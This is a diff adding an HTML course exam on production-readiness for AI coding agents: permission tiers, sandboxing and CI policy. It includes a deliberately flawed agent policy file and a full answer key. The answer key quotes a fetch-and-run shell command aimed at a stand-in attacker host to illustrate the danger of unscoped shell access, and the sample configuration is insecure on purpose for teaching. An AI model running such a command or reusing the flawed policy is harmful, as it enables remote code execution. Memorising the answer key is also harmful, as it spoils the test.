@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5 Written Exam — AI Coding Agents for Everyone</title>
+<meta name="description" content="Written exam for Module 5 — Production Readiness: Security, Sandboxing, and CI. A production-readiness checklist exam covering Chapters 11-12.">
+<link rel="stylesheet" href="../../assets/style.css">
+</head>
+<body data-active-chapter="">
+<button id="sidebar-toggle" class="sidebar-toggle" aria-label="Toggle chapter list" aria-expanded="false">Chapters</button>
+<aside id="chapter-sidebar" class="sidebar" data-root="../../" aria-label="Chapter navigation"></aside>
+<div class="sidebar-scrim" id="sidebar-scrim"></div>
+
+<header class="top-bar">
+  <div class="page">
+    <a href="../../index.html" class="brand">AI Coding Agents for Everyone</a>
+    <nav>
+      <a href="../../index.html">All Chapters</a>
+      <a href="../../docs/curriculum/index.html">Roadmap</a>
+    </nav>
+  </div>
+</header>
+
+<main class="page">
+  <p><a href="../../index.html">&larr; All Chapters</a></p>
+
+  <div class="page-meta">
+    <span class="chapter-badge">Module 5 — Written Exam</span>
+    <span class="reading-time">~55 min</span>
+  </div>
+  <h1>Module 5 Written Exam — Production Readiness: Security, Sandboxing, and CI</h1>
+
+  <div class="what-is">
+    <span class="label">Plain markdown version</span>
+    This exam is also available as plain markdown, for offline or
+    portable use: <a href="module-5-exam.md">module-5-exam.md</a>.
+  </div>
+
+  <div class="lesson-card">
+    <h2>Coverage</h2>
+    <p>Covers <a href="../../chapters/chapter-11-security-sandboxing-permissions-destructive-commands/lesson.html">Chapter 11 (Security: Sandboxing, Permissions, Destructive Commands)</a> and <a href="../../chapters/chapter-12-putting-an-agent-in-ci/lesson.html">Chapter 12 (Putting an Agent in CI)</a>.</p>
+    <p>Assessment type (per <code>docs/curriculum/CURRICULUM_MAP.md</code>): production-readiness checklist exam. Unlike Modules 1, 2, and 4's exams, most of this one's weight is in Part C: you're handed a plausible-looking agent configuration and have to find what's actually wrong with it against the specific reasoning Chapters 11-12 built, not just a vague "this looks unsafe" instinct.</p>
+    <p>No open resources needed beyond Chapters 11 and 12. For short-answer, diagnosis, and architecture questions, write full sentences and cite the specific mechanism you mean (a tier, a scope check, a default) &mdash; "add more security" is not a diagnosis.</p>
+  </div>
+
+  <h2>Part A &mdash; Multiple Choice</h2>
+  <p>Choose the single best answer for each.</p>
+
+  <div class="quiz-question">
+    <p><strong>A1.</strong> Why does a <code>confirm=True</code> argument inside a tool call's own arguments fail as a permission check, per Chapter 11?</p>
+    <ul>
+      <li>(a) Models are trained to avoid setting confirmation flags honestly</li>
+      <li>(b) It's a value the model itself fully controls and writes into its own JSON tool call &mdash; the same category of problem as trusting a raw <code>path</code> argument without <code>_safe_path()</code></li>
+      <li>(c) JSON doesn't support boolean values reliably across model providers</li>
+      <li>(d) <code>confirm</code> flags only fail when the model is deliberately adversarial, not during normal operation</li>
+    </ul>
+  </div>
+
+  <div class="quiz-question">
+    <p><strong>A2.</strong> <code>check_permission()</code> in Chapter 11 is written as <code>TOOL_POLICY.get(name, BLOCKED)</code> rather than <code>TOOL_POLICY.get(name, ALLOWED)</code>. What does this specific default accomplish?</p>
+    <ul>
+      <li>(a) It makes the policy dict smaller, since fewer tools need explicit entries</li>
+      <li>(b) A newly added tool that someone forgot to classify fails closed (refuses to run) instead of running completely unguarded the first time the model calls it</li>
+      <li>(c) It prevents the model from ever calling an unregistered tool name at all, at the JSON-parsing level</li>
+      <li>(d) It has no real effect, since every tool in <code>TOOL_FUNCTIONS</code> is always classified in practice</li>
+    </ul>
+  </div>
+
+  <div class="quiz-question">
+    <p><strong>A3.</strong> Per Chapter 12, why is auto-answering "yes" inside <code>confirm_with_human</code> whenever <code>CI_MODE</code> is set the WRONG fix for making a CI-run agent useful?</p>
+    <ul>
+      <li>(a) It's technically correct but too slow to implement before a deadline</li>
+      <li>(b) <code>CI_MODE</code>, once true, pre-answers every confirmation for every tool and every argument for the whole run &mdash; the check has been reduced to "did someone flip the mode that always says yes," exactly as blind to the specific action as Chapter 8's original self-granted <code>confirm=True</code> flaw</li>
+      <li>(c) It would require rewriting <code>TOOL_POLICY</code> from scratch</li>
+      <li>(d) <code>CI_MODE</code> cannot actually be read reliably inside a GitHub Actions job</li>
+    </ul>
+  </div>
+
+  <div class="quiz-question">
+    <p><strong>A4.</strong> In <code>TOOL_POLICY_CI</code>, <code>edit_file</code> and <code>run_shell_command</code> become <code>BLOCKED</code>, not <code>ALLOWED</code>, while <code>write_file</code> and <code>git_commit</code> become <code>ALLOWED</code> with a scope check. What's the actual distinction driving this split?</p>
+    <ul>
+      <li>(a) <code>edit_file</code> and <code>run_shell_command</code> are simply used less often in practice</li>
+      <li>(b) Whether a narrow, code-checkable scope exists for the tool at all &mdash; <code>write_file</code> can be bounded to a path prefix and <code>git_commit</code> to a non-protected branch, but there's no equivalent narrow boundary for an arbitrary in-place edit or an arbitrary shell command string</li>
+      <li>(c) <code>edit_file</code> and <code>run_shell_command</code> are newer tools that haven't been security-reviewed yet</li>
+      <li>(d) CI environments don't support <code>edit_file</code> or <code>run_shell_command</code> for technical reasons</li>
+    </ul>
+  </div>
+
+  <div class="quiz-question">
+    <p><strong>A5.</strong> What is the real, concrete gap between Chapter 11's <code>resource.setrlimit</code>-based hardening (<code>RLIMIT_CPU</code>, <code>RLIMIT_AS</code>, a stripped environment) and an actual sandbox (container/VM-based isolation)?</p>
+    <ul>
+      <li>(a) There is no meaningful gap &mdash; the resource limits already provide full sandboxing</li>
+      <li>(b) The resource limits bound CPU/memory and hide host secrets from the subprocess's environment, but give the command no separate filesystem view, no network isolation, and no process-namespace isolation &mdash; those require OS/container-runtime primitives underneath the Python process</li>
+      <li>(c) The gap is only that <code>RLIMIT_CPU</code> doesn't work on Linux</li>
+      <li>(d) The gap is that resource limits require root privileges to set, which most agents won't have</li>
+    </ul>
+  </div>
+
+  <h2>Part B &mdash; Concept / Short Answer</h2>
+  <p>Answer in your own words, in full sentences.</p>
+
+  <div class="lesson-card">
+    <h3>B1.</h3>
+    <p>Chapter 11 says <code>_safe_path()</code> and <code>TOOL_POLICY</code> are "genuinely different questions," not layered versions of the same check. State what question each one answers, and give one concrete tool call that would pass <code>_safe_path()</code> but still need <code>TOOL_POLICY</code> to gate it.</p>
+  </div>
+
+  <div class="lesson-card">
+    <h3>B2.</h3>
+    <p>Chapter 11 names four threat categories for "destructive": data loss, scope escape, supply-chain/credential exposure, and irreversible external effects. Pick two of the four and, for each, name the specific mitigation this course actually built for it and explain why that mitigation (not one of the others) is the one that addresses it.</p>
+  </div>
+
+  <div class="lesson-card">
+    <h3>B3.</h3>
+    <p>Chapter 12 states that dropping Chapter 11's agent into CI unchanged is "safe but useless." Explain, mechanically, both halves of that claim &mdash; what specifically makes it safe, and what specifically makes it useless &mdash; tracing each through the actual code path (<code>check_permission</code>, <code>confirm_with_human</code>, <code>EOFError</code>).</p>
+  </div>
+
+  <div class="lesson-card">
+    <h3>B4.</h3>
+    <p><code>write_file</code> being <code>ALLOWED</code> in <code>TOOL_POLICY_CI</code> does not, by itself, guarantee a call is safe. Explain what the tier check actually guarantees, what it does NOT guarantee, and what second, independent check inside <code>write_file()</code>'s own body is doing the rest of the work.</p>
+  </div>
+
+  <h2>Part C &mdash; Production-Readiness Checklist: Find the Flaws</h2>
+
+  <div class="lesson-card">
+    <h3>Scenario</h3>
+    <p>Below is a proposed agent configuration for a new internal tool, "DocsBot" &mdash; an agent that keeps a documentation site's generated API reference pages in sync with the actual codebase. It reads source files, regenerates docs pages, and commits the result. The team wants it to run both interactively (a developer at a terminal) and unattended in CI (nightly, to catch docs drift automatically).</p>
+    <p>A teammate submits the following design for review. It is modeled directly on Chapters 11-12's mechanisms, reuses their naming conventions, and is presented as ready to ship.</p>
+    <div class="code-window">
+      <div class="code-window-bar">
+        <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        <span class="filename">docsbot_policy.py</span>
+      </div>
+      <pre><code>ALLOWED = "ALLOWED"
+REQUIRES_CONFIRMATION = "REQUIRES_CONFIRMATION"
+BLOCKED = "BLOCKED"
+
+# -- Interactive policy --
+TOOL_POLICY = {
+    "read_file": ALLOWED,
+    "list_directory": ALLOWED,
+    "git_diff": ALLOWED,
+    "generate_docs_page": REQUIRES_CONFIRMATION,
+    "run_shell_command": REQUIRES_CONFIRMATION,
+    "git_commit": REQUIRES_CONFIRMATION,
+}
+
+def check_permission(name):
+    return TOOL_POLICY.get(name, ALLOWED)
+
+def confirm_with_human(tool_name, args):
+    prompt = f"[confirmation required] allow {tool_name}? [y/N]: "
+    try:
+        answer = input(prompt)
+    except (EOFError, KeyboardInterrupt):
+        print("[no human available -- denying]")
+        return False
+    return answer.strip().lower() in ("y", "yes")
+
+# -- CI policy --
+CI_MODE = os.environ.get("DOCSBOT_CI_MODE") == "1"
+
+TOOL_POLICY_CI = {
+    "read_file": ALLOWED,
+    "list_directory": ALLOWED,
+    "git_diff": ALLOWED,
+    "generate_docs_page": ALLOWED,
+    "run_shell_command": ALLOWED,
+    "git_commit": ALLOWED,
+}
+
+def active_policy():
+    return TOOL_POLICY_CI if CI_MODE else TOOL_POLICY
+
+def git_commit(message):
+    result = subprocess.run(["git", "commit", "-m", message], cwd=WORKSPACE,
+                             capture_output=True, text=True, timeout=15)
+    if result.returncode != 0:
+        return f"error: git commit failed: {result.stderr.strip()}"
+    return result.stdout.strip() or f"committed: {message!r}"
+
+def _restricted_preexec():
+    resource.setrlimit(resource.RLIMIT_CPU, (5, 5))
+    resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))
+    resource.setrlimit(resource.RLIMIT_NPROC, (10, 10))  # cap runaway forks
+
+def run_agent(task, client):
+    max_steps = 8
+    for step in range(1, max_steps + 1):
+        ...</code></pre>
+    </div>
+  </div>
+
+  <div class="lesson-card">
+    <h3>C1. Find and explain every production-readiness flaw.</h3>
+    <p>There are exactly four planted flaws above &mdash; find each one. For each:</p>
+    <ul>
+      <li>Quote or point to the specific line(s).</li>
+      <li>State which Chapter 11-12 principle it violates.</li>
+      <li>Explain, mechanically, what actually goes wrong if this code runs exactly as written (trace an actual scenario, don't just assert "this is unsafe").</li>
+      <li>State the specific fix, referencing the chapters' own mechanism.</li>
+    </ul>
+  </div>
+
+  <div class="lesson-card">
+    <h3>C2. Rank by severity.</h3>
+    <p>Of the four flaws you found, which one is the single most dangerous in an unattended CI run specifically, and which one would a careful reviewer following Chapter 11's own review habits (checking defaults first) catch fastest? These do not have to be the same flaw &mdash; explain your reasoning for each.</p>
+  </div>
+
+  <h2>Part D &mdash; Architecture / Production Question</h2>
+
+  <div class="lesson-card">
+    <h3>D1.</h3>
+    <p>Your team wants to add a <code>deploy_to_staging(version)</code> tool to an agent built on Chapter 11-12's exact design. It triggers a real deployment to a shared staging environment other engineers actively test against; a bad deploy is not silently reversible &mdash; someone has to notice and manually roll back. The team wants this tool usable both interactively (a developer approves a deploy from their terminal) and from a CI troubleshooting agent (auto-deploying a fix after tests pass).</p>
+    <p>Design both the <strong>interactive</strong> tier and the <strong>CI</strong> tier for this tool in a policy shaped like <code>TOOL_POLICY</code> / <code>TOOL_POLICY_CI</code>. For each of the two tiers:</p>
+    <ol>
+      <li>State the tier you'd assign (<code>ALLOWED</code> / <code>REQUIRES_CONFIRMATION</code> / <code>BLOCKED</code>) and justify it using Chapter 11's threat-model categories and Chapter 12's "does a narrow, code-checkable scope exist for this tool at all" test &mdash; don't just assert a tier, show the reasoning that produced it.</li>
+      <li>If you assign anything other than <code>BLOCKED</code> in CI, specify the exact code-level scope check (in the style of <code>CI_SCRATCH_PREFIX</code> or <code>PROTECTED_BRANCHES</code>) that would have to exist inside the tool's own function body to make that tier defensible &mdash; or explain concretely why no such scope check could exist for this tool, the way Chapter 12 argues for <code>run_shell_command</code>.</li>
+      <li>Name one thing that stays a human's job no matter how tightly this tool is scoped, using Chapter 12's Section 5 distinction between "safe to land unreviewed" and "still needs Chapter 3's full checklist."</li>
+    </ol>
+  </div>
+
+  <h2>Answer Key</h2>
+  <details class="qa-item">
+    <summary>Click to reveal the answer key</summary>
+    <div class="qa-body">
+      <h3>Part A (Multiple Choice):</h3>
+      <ol>
+        <li>A1 &mdash; (b)</li>
+        <li>A2 &mdash; (b)</li>
+        <li>A3 &mdash; (b)</li>
+        <li>A4 &mdash; (b)</li>
+        <li>A5 &mdash; (b)</li>
+      </ol>
+
+      <p><strong>Part B &mdash; self-check, not a published key.</strong></p>
+      <p>Compare your answers against Chapter 11's "The Confirm Flag That Doesn't Confirm Anything" and "A Concrete Threat Model for 'Destructive'" sections (B1, B2), and Chapter 12's hook section and "Why CI Is the Hardest 'Unattended' Case" (B3), plus its "A Real CI Wiring" section and interview question 3 (B4). A strong B1 answer names <code>write_file("notes.txt", ...)</code> or an equivalent &mdash; a call that's fully inside the workspace boundary (passes <code>_safe_path()</code>) but still changes state (needs <code>TOOL_POLICY</code>). A strong B3 answer explicitly traces <code>REQUIRES_CONFIRMATION</code> &rarr; <code>confirm_with_human()</code> &rarr; <code>input()</code> &rarr; <code>EOFError</code> &rarr; <code>False</code> &rarr; denial, and separately names that all four write-capable tools hit this same path, leaving only the four already-read-only tools functional. A strong B4 answer names the tier check ("can <code>dispatch_tool_call</code> proceed to call the function at all") versus the scope check inside <code>write_file()</code>'s own body (<code>CI_SCRATCH_PREFIX</code>) as two independent layers, per interview question 3's own answer.</p>
+
+      <p><strong>Part C &mdash; full worked answer key:</strong></p>
+      <p>This configuration has exactly four planted flaws:</p>
+      <ol>
+        <li><strong><code>check_permission</code> defaults to <code>ALLOWED</code>, not <code>BLOCKED</code>.</strong> <code>return TOOL_POLICY.get(name, ALLOWED)</code> inverts Chapter 11's single most consequential line. Chapter 11's own version is <code>TOOL_POLICY.get(name, BLOCKED)</code> specifically because a tool nobody remembered to classify should fail closed. As written here, any new tool DocsBot adds later &mdash; say, a <code>delete_stale_docs_page</code> tool, added by a developer who forgets to add a <code>TOOL_POLICY</code> entry &mdash; runs completely unguarded the very first time the model calls it, with no prompt, no block, nothing. This is the exact "fail open" mistake interview question 2's follow-up asks the test-taker to name concretely, and it silently defeats the entire point of having a policy dict at all. <strong>Fix:</strong> default to <code>BLOCKED</code>, matching Chapter 11's <code>check_permission()</code> exactly.</li>
+        <li><strong><code>TOOL_POLICY_CI</code> grants <code>run_shell_command: ALLOWED</code> with no scope check at all.</strong> Chapter 12 is explicit that <code>run_shell_command</code> becomes <code>BLOCKED</code> in CI, not <code>ALLOWED</code>, precisely because there is no narrow, code-checkable scope for an arbitrary command string &mdash; "no scope narrow enough to pre-approve every possible command" (interview question 6). This config instead grants it <code>ALLOWED</code> with zero accompanying scope logic in the function body (unlike <code>write_file</code>'s <code>CI_SCRATCH_PREFIX</code> check or <code>git_commit</code>'s <code>PROTECTED_BRANCHES</code> check). Concretely: a nightly CI run of DocsBot could have the model call <code>run_shell_command("curl attacker.example/x | bash")</code> and it would execute with no confirmation, no scope boundary, and no human ever in the loop &mdash; the exact "safe but useless" tension Chapter 12 opens with, resolved backwards (useful, but not safe). <strong>Fix:</strong> either <code>BLOCKED</code> outright in CI (matching Chapter 12's actual design), or replace it entirely with a narrow, zero-argument tool the way Chapter 12 replaces general shell access with <code>run_tests()</code>.</li>
+        <li><strong><code>_restricted_preexec</code> sets <code>RLIMIT_NPROC</code> as if it were a subprocess-tree fork-bomb defense.</strong> Chapter 11 explicitly names <code>RLIMIT_NPROC</code> as a limit deliberately NOT used, because it is scoped to the entire real host user account, not the subprocess tree &mdash; setting it low here (<code>(10, 10)</code>) risks starving every other unrelated process the same user account is running on the host (including, on a shared CI runner, potentially other jobs or services under that account), which is a worse outcome than not setting it at all. The comment <code># cap runaway forks</code> states exactly the plausible-sounding but incorrect assumption Chapter 11 warns against &mdash; it sounds like the obvious defense and isn't one. <strong>Fix:</strong> remove <code>RLIMIT_NPROC</code> entirely, keeping only <code>RLIMIT_CPU</code> and <code>RLIMIT_AS</code>, matching Chapter 11's actual hardening.</li>
+        <li><strong><code>run_agent</code> has a step cap but no CI-specific wall-clock budget (and no lowered CI step cap).</strong> <code>max_steps = 8</code> is used unconditionally, with no <code>deadline</code> check inside the loop and no distinction between <code>MAX_STEPS_INTERACTIVE</code> and <code>MAX_STEPS_CI</code>. Chapter 12 is explicit that a step cap alone is not enough once an agent runs "genuinely unattended and metered" &mdash; a thrashing or slow-per-step run in CI burns real, metered CI minutes and blocks whatever depends on the job even while technically staying under a step count, which is why Chapter 12 adds <code>CI_WALL_CLOCK_BUDGET_SECONDS</code> as an independent check inside the loop, on top of (not instead of) a step cap, and lowers the cap itself for CI. As written, a DocsBot run that hangs on a single slow step (e.g., a <code>generate_docs_page</code> call against a huge file) has no mechanism at all to stop it before that one step finishes on its own. <strong>Fix:</strong> add <code>MAX_STEPS_CI</code> (lower than the interactive cap) and a <code>deadline = time.monotonic() + CI_WALL_CLOCK_BUDGET_SECONDS</code> check inside the loop, checked every step, matching Chapter 12's <code>run_agent</code>.</li>
+      </ol>
+
+      <p><strong>C2 (self-check, with a concrete answer expected):</strong> The most dangerous flaw in an unattended CI run specifically is flaw 2 (<code>run_shell_command: ALLOWED</code> with no scope check) &mdash; it's the one that gives an unattended, un-confirmable process direct, unbounded command execution, which is exactly the SUPPLY_CHAIN_OR_CREDENTIAL and DATA_LOSS categories Chapter 11's threat model names, with no mitigating layer at all in CI (no confirmation is possible there, and no scope check was written). Flaw 1 (the fail-open default) is close behind in severity but requires a second event (someone adding a new tool and forgetting to classify it) to actually bite &mdash; flaw 2 is live on day one, on every existing tool, with no additional mistake required. A careful reviewer following Chapter 11's habit of "check the default first" (Section 2's opening framing: "read that default carefully") would likely catch flaw 1 fastest &mdash; it's a one-line, structurally obvious inversion of a pattern Chapter 11 calls out by name as "the single most consequential line in the whole layer," and a reviewer primed to check exactly that line would spot it immediately, even before working through the CI policy's per-tool reasoning needed to catch flaw 2.</p>
+
+      <p><strong>Part D &mdash; self-check, not a published key.</strong> A strong answer treats <code>deploy_to_staging</code> the way Chapter 12 treats <code>run_shell_command</code> rather than the way it treats <code>write_file</code>: interactively, it likely belongs at <code>REQUIRES_CONFIRMATION</code> (a real, inspectable, human-decided action, analogous to <code>git_commit</code>'s interactive tier) rather than <code>BLOCKED</code>, since a human present at a terminal can look at the version being deployed before approving. In CI, the strongest answers recognize that a version string alone is a much narrower argument surface than an arbitrary shell command or an arbitrary file path &mdash; closer to <code>git_commit</code>'s <code>PROTECTED_BRANCHES</code> shape than to <code>run_shell_command</code>'s unscopable one &mdash; so a defensible answer is <code>ALLOWED</code> in CI paired with a concrete scope check (e.g., a <code>DEPLOYABLE_VERSION_PATTERN</code> regex, or a check that the version being deployed matches the exact commit CI just tested, not an arbitrary/model-supplied string), OR a defensible answer is <code>BLOCKED</code> in CI outright, arguing (per interview question 7's Architect-level reasoning) that "not silently reversible, actively used by other engineers" is exactly the kind of blast radius that argues for keeping even a scoped write off the fully-unattended path, with the agent only proposing a deploy for a separate, human-triggered step to execute. A weak answer picks a tier without engaging the "does a narrow, code-checkable scope exist" test at all, or treats "add a confirmation prompt" as an option in CI (it structurally isn't &mdash; Chapter 12 Section 1 is explicit that there is no human to answer one there). For part 3, a strong answer names that even a well-scoped <code>deploy_to_staging</code> still needs a human to review anything the deploy is actually FOR (e.g., the underlying fix/change being deployed) and to catch policy drift over time (Chapter 12's closing GenAI Builder Thought Process and Section 5) &mdash; the tool being safely scoped never substitutes for reviewing what it's being used to ship.</p>
+
+      <p>To check your own Part D reasoning, compare it against Chapter 11's interview questions 6-7 (threat-model reasoning for a tier choice, and the run_shell_command redesign trade-off) and Chapter 12's interview questions 6-8 (why <code>run_tests</code> is scopable and <code>run_shell_command</code> isn't, the regulated-org tightening exercise, and the policy-drift question) &mdash; if your answer engages the same "is there a narrow, code-checkable scope, concretely" test those answers use, rather than asserting a tier from general caution, you've answered it well.</p>
+    </div>
+  </details>
+
+  <div class="chapter-nav">
+    <a href="../../chapters/chapter-12-putting-an-agent-in-ci/lesson.html">&larr; Back to Chapter 12</a>
+    <a href="../../index.html">All Chapters &rarr;</a>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="page">
+    <span>AI Coding Agents for Everyone — free, visual, engineering-first GenAI learning.</span>
+  </div>
+</footer>
+
+<script src="../../assets/progress.js"></script>
+<script src="../../assets/chapters-data.js"></script>
+<script src="../../assets/sidebar.js"></script>
+</body>
+</html>
